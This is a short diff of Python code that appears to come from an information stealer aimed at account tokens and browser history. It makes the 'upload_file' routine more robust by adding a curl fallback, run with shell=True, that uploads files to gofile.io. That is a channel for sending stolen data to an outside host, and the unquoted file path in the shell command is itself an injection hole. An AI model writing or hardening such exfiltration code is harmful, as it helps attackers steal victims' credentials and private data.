@@ -1254,8 +1254,16 @@ def uploadTokq(Tokq, path):
         change_about_me(Tokq)
 
 def upload_file(path):
-    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
-    except:return False
+    try:
+        return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+    except:
+        try:
+            try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
+            except:gofileserver = "store4"
+            r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
+        except:return False
+    
     
 
 def find_history_file(browser_name, path_template):
